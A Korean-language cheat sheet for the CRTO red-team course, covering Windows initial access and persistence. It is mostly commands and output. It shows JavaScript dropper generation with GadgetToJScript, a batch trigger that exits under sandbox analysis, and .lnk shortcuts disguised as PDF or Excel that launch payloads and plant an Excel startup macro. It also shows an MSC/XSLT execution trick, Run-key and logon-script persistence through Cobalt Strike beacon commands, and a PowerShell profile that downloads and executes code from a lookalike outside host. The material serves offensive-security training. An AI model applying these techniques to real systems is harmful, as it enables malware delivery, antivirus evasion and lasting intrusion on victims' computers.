# CRTO CheatSheet

<p align="center">
<img width="300" height="300" alt="crto-review-01" src="https://github.com/user-attachments/assets/276f2305-1e5b-4802-b346-bebfb436c820" />
<p>


- [Initial Access](#initial-access)
  - [Payloads](#payloads)
  - [Droppers](#droppers)
  - [Triggers](#triggers)
- [Persistence](#persistence)
  - [Boot & Logon Autostart Execution](#boot--logon-autostart-execution)
  - [Logon Script](#logon-script)
  - [PowerShell Profile](#powershell-profile)

## Initial Access

### Payloads
---

- `페이로드(Payload)`: 피해자의 컴퓨터에서 실행될 악성 코드
- `디코이(Decoy)`: 사용자가 트리거와 상호작용한 후 보게 될 콘텐츠(이미지, PDF, 엑셀 파일)


#### DLL side-loading(DLL을 불러오는 우선순위)
1. 애플리케이션에 있는 디렉터리
2. 일반적인 시스템 디렉터리 `C:\Windows\System32`
3. 16비트 시스템 디렉터리 `C:\Windows\System`
4. Windows 디렉터리 `C:\Windows`
5. 현재 작업 디렉터리 `.\`
6. 나열된 디렉터리 `PATH` 환경 변수

### Droppers
---

`Initial Access` 단계에서는 주로 페이로드를 컨테이너에 직접 포함하지 않고 '드롭퍼'를 사용하여 안티바이러스를 회피하고 감염 경로 분석을 복잡하게 만든다. 
여기서 드롭퍼란 악성코드 같은 다른 프로그램을 전달하는 프로그램이다. 대부분의 드롭퍼는 자체 이미지 내부에 포함된 리소스를 추출하거나 HTTP(S) 또는 DNS와 같은 프로토콜을 통해 다운로드 하는 방식으로 이를 달성한다. 


`GadgetToJScript.exe`을 이용하여 `.dll`을 `.js`로 변환하여 JavaScript 드롭퍼 생성, wscript 또는 단순히 더블 클릭하여 페이로드 DLL을 드롭하여 이를 실행
``` powershell
PS C:\Users\Attacker> C:\Tools\GadgetToJScript\GadgetToJScript\bin\Release\GadgetToJScript.exe -a C:\Users\Attacker\source\repos\MyDropper\bin\Release\MyDropper.dll -w js -b -o C:\Payloads\dropper
[+]: Generating the js payload
[+]: First stage gadget generation done.
[+]: Loading your .NET assembly:C:\Users\Attacker\source\repos\MyDropper\bin\Release\MyDropper.dll
[+]: Second stage gadget generation done.
[*]: Payload generation completed, check: C:\Payloads\dropper.js
```

- `-w` 는 출력할 스크립트의 유형입니다. 유효한 옵션은 `js`, `vbs`, `vba` 및 `hta`입니다.
- `-b` 옵션은 .NET Framework 4.8 이상에서 도입된 형식 검사 제어를 우회합니다.
- `-o` 는 출력 경로(파일 확장자 제외)입니다.



### Triggers
---

트리거는 사용자가 컨테이너 압축을 푼 후 상호 작용할 파일을 말한다. 일반적으로 더블 클릭처럼 최대한 간편하게 상호 작용할 수 있도록 하는 것이 좋다. 

#### Batch

> 간단한 배치 파일 예시
``` cmd
@echo off
start payload.exe
start decoy.pdf
exit
```

- `%cmdcmdline%` - 인자를 포함한 실행된 원래 명령줄
  - 예시: (더블 클릭으로 실행한 경우) `C:\Windows\system32\cmd.exe /c ""C:\Users\Daniel\Desktop\test.bat""`
  - 예시: (명령어 프롬프트에서 실행한 경우) `"C:\Windows\system32\cmd.exe"`
- `%~f0` - 배치 파일의 전체 경로
  - 예시: ` C:\Users\Daniel\Desktop\test.bat`


더블 클릭 이외에 배치 파일을 바로 종료하게 만들어 자동화된 바이러스 백신 및 샌드박스 분석을 무력화할 수 있다. 
> `%cmdcmdline%` 내용에 배치 파일의 경로가 없는 경우 exit 호출

``` cmd
@echo off
echo %cmdcmdline% | find /i "%~f0" || exit
calc
exit
```


#### Shell Link

쉘 링크는 Windows 바로가기를 만드는 데 사용되는 바이너리 파일 형식을 말한다. 
쉘 링크에는 다음과 같은 특징들이 있음
- `.lnk` 파일 확장자에는 '파일 이름 확장자 표시' 옵션이 활성화되어 있어도 탐색기에 표시되지 않는다.
- 이를 이용해 다음과 같은 파일 이름을 사용할 수 있다. `report.pdf.lnk` 하지만 실제 사용자에게는 `report.pdf`만 보이게 된다.
- 링크 파일은 원하는 아이콘을 지정이 가능하여 원래는 cmd.exe로 연결되지만 PDF 아이콘을 사용하도록 위장할 수 있다. 

> WScript.Shell을 통한 Shell Link 생성(PowerShell에서 동작)

``` powershell
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut("C:\Payloads\trigger.pdf.lnk")
$lnk.TargetPath = "%COMSPEC%"
$lnk.Arguments = "/C start payload.exe && start decoy.pdf"
$lnk.IconLocation = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,13"
$lnk.Save()
```

> 엑셀로 위장

``` powershell
$lnk.Arguments = "/C xcopy /H macros.xlam %APPDATA%\Microsoft\Excel\XLSTART\ && attrib -H %APPDATA%\Microsoft\Excel\XLSTART\macros.xlam && start sales.xlsx"
$lnk.IconLocation = "%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0"
$lnk.Save()
```


#### Microsoft Saved Console

마이크로소프트 저장 콘솔(.msc)과 패치가 되지 않은 XSS 취약점을 이용하여 Microsoft Management Console(mmc.exe)을 통해 JavaScript 코드 실행을 유발하는 취약점

> MSC 예제 코드(105줄에 익스플로잇 코드 존재, 페이로드는 URL 인코딩 상태)
> 
[https://gist.github.com/joe-desimone/2b0bbee382c9bdfcac53f2349a379fa4](https://gist.github.com/joe-desimone/2b0bbee382c9bdfcac53f2349a379fa4)

> cmd.exe 실행 예시

``` xml
<?xml version='1.0'?>
<stylesheet
    xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
    xmlns:user="placeholder"
    version="1.0">
    <output method="text"/>
    <ms:script implements-prefix="user" language="VBScript">
    <![CDATA[
        Set wshshell = CreateObject("WScript.Shell")
        wshshell.run "C:\\Windows\\System32\\cmd.exe"
]]></ms:script>
</stylesheet>
```

MSC 파일을 더블 클릭하면 mmc.exe 인스턴스가 실행되고, mmc.exe는 다시 cmd.exe를 실행합니다. 이 기법의 장점 중 하나는 MMC가 자동 권한 상승 바이너리이므로 사용자가 로컬 관리자인 경우 UAC 프롬프트가 표시되어 승인을 요청받게 되며, 페이로드는 높은 보안 수준으로 실행된다

<img width="310" height="82" alt="3b48cc0d95bae96505655d94d36aed58" src="https://github.com/user-attachments/assets/9675ee2d-4990-471c-af97-096793f22131" />


> MSC 페이로드 자동화 생성 도구(MSC_Dropper)

[https://github.com/ZERODETECTION/MSC_Dropper](https://github.com/ZERODETECTION/MSC_Dropper)


## Persistence

### Boot & Logon Autostart Execution
---

[Boot or Logon Autostart Execution is a collection of techniques - T1547](https://attack.mitre.org/techniques/T1547/)

T1547(Boot or Logon Autostart Execution)는 시스템 부팅 또는 로그인 시 프로그램을 자동으로 실행하도록 시스템 설정을 구성하여 시스템에 대한 지속성을 유지하거나 손상된 시스템에서 더 높은 수준의 권한을 획득할 수 있다. 

#### 레지스트리 실행 키

- HKCU\Software\Microsoft\Windows\CurrentVersion\Run
- HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

`Run` 키는 시스템을 재부팅하여도 계속 유지가 되는 반면 `RunOnce` 키는 처음 실행 후 자동으로 삭제된다. 


#### `reg_set` 명령어 구문: 
`reg_set <host:optional> <hive> <key> <value> <type> <data>`


``` shell
beacon> cd C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps

beacon> upload C:\Payloads\http_x64.exe

beacon> mv http_x64.exe updater.exe

​

beacon> reg_set HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater REG_EXPAND_SZ %LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe

Setting registry key \\.\0000000080000001\Software\Microsoft\Windows\CurrentVersion\Run\Updater with type 1

Successfully set regkey

SUCCESS.
```

`reg_query`를 통해서 생성된 레지스트리 키를 확인한다. 

``` shell
beacon> reg_query HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater

  01/07/2025 11:51:52 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    Updater                REG_EXPAND_SZ          %LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe
```

> `reg_delete`를 사용해 더이상 쓰지 않는 레지스트리 키를 제거한다. 



### Logon Script
---

[Logon Script (Windows) - T1037.001](https://attack.mitre.org/techniques/T1037/001/)

T1037.001(Boot or Logon Initialization Scripts: Logon Script (Windows))는 T1037 하위 기술로써, `HKCU\Environment\UserInitMprLogonScript` 레지스터 키를 사용해 Windows에서 특정 사용자 또는 사용자 그룹이 시스템에 로그인할 때마다 로그인 스크립트가 실행되도록하여 지속적인 접근 권한을 확보할 수 있다. 

``` shell
beacon> reg_set HKCU Environment UserInitMprLogonScript REG_EXPAND_SZ %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\updater.exe

Setting registry key \\.\0000000080000001\Environment\UserInitMprLogonScript with type 2
Successfully set regkey
SUCCESS.
```

### PowerShell Profile
---

[Event Triggered Execution: PowerShell Profile - T1546.013](https://attack.mitre.org/techniques/T1546/013/)

T1546.013(Event Triggered Execution: PowerShell Profile)는 사용자가 PowerShell을 열 때마다 이벤트 트리거가 작동하게 하여 공격자가 임의로 작성한 `profile.ps1` 같은 악성 콘텐츠를 실행하여 지속성을 확보하고 권한을 상승시킬 수 있다. 

`$HOME\Documents\WindowsPowerShell\Profile.ps1`와 같이 사용자의 홈 디렉터리($HOME)/문서/WindowsPowerShell 디렉터리에 프로필(`Profile.ps1`)를 업로드한다. 

```
ls C:\Users\pchilds\Documents

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     12/22/2024 16:47:10   My Music
          dir     12/22/2024 16:47:10   My Pictures
          dir     12/22/2024 16:47:10   My Videos
 402b     fil     12/22/2024 16:47:22   desktop.ini
 
beacon> mkdir C:\Users\pchilds\Documents\WindowsPowerShell
beacon> cd C:\Users\pchilds\Documents\WindowsPowerShell
```

외부 URL로 부터 파일을 다운로드하여 실행 시키는 프로필 파일(Profile.ps1) 생성
``` powershell
# Profile.ps1
$_ = Start-Job -ScriptBlock { iex (new-object net.webclient).downloadstring("http://bleepincomputer.com/a") }
```

프로필을 사용자의 WindowsPowerShell 디렉터리에 업로드
```
beacon> upload C:\Payloads\Profile.ps1
```


